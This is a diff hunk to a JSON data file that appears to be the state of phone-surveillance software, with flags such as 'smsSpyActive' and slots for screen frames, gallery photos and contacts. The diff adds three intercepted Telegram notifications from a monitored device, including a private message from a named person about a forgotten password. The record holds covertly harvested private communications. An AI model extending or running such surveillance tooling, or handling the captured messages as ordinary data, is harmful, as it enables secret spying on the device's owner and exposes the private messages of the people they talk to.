@@ -8129,7 +8129,32 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "",
+        "content": "MB In bergabung di Telegram!",
+        "time": "02/04 00:06",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775063236059
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Pegasus Message: Dewangga",
+        "content": "Cok kalo lupa pw gmn",
+        "time": "02/04 00:06",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775063236042
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "185 pesan baru dari 65 obrolan",
+        "time": "02/04 00:06",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775063236020
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
